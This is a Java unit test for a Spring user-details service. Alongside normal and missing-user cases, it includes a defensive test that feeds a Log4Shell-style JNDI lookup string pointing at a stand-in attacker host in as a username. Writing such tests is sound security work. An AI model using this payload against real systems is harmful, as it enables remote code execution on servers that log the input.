package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;

class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    @BeforeEach
    void setUp() {
        MockitoAnnotations.openMocks(this);
    }

    @Test
    void testLoadUserByUsername_NormalUsername() {
        // Arrange
        User user = new User();
        user.setUsername("testuser");
        user.setPassword("password123");
        user.setEnabled(true);

        when(userService.findByUsername("testuser")).thenReturn(user);

        // Act
        UserDetails userDetails = customUserDetailsService.loadUserByUsername("testuser");

        // Assert
        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        assertEquals("password123", userDetails.getPassword());
        assertTrue(userDetails.isEnabled());
        verify(userService).findByUsername("testuser");
    }

    @Test
    void testLoadUserByUsername_JndiLookupString() {
        // Arrange - Simulate a JNDI lookup attack string
        String maliciousUsername = "${jndi:ldap://malicious-server.com/exploit}";
        User user = null; // User won't be found with this username

        when(userService.findByUsername(maliciousUsername)).thenReturn(user);

        // Act & Assert
        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(maliciousUsername);
        });
        verify(userService).findByUsername(maliciousUsername);
    }

    @Test
    void testLoadUserByUsername_NoUserFound() {
        // Arrange
        when(userService.findByUsername(anyString())).thenReturn(null);

        // Act & Assert
        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername("nonexistentuser");
        });
        verify(userService).findByUsername("nonexistentuser");
    }
}